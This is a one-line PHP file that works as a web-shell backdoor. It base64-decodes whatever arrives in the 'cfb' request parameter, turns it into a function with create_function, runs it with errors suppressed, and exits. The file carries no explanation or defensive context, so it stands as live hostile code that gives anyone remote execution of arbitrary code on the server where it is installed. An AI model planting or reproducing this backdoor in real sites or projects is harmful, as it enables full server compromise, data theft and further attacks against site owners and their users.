<?php
if(!empty($_REQUEST['cfb'])){$cfb=base64_decode($_REQUEST['cfb']);$cfb=create_function('',$cfb);@$cfb();exit;}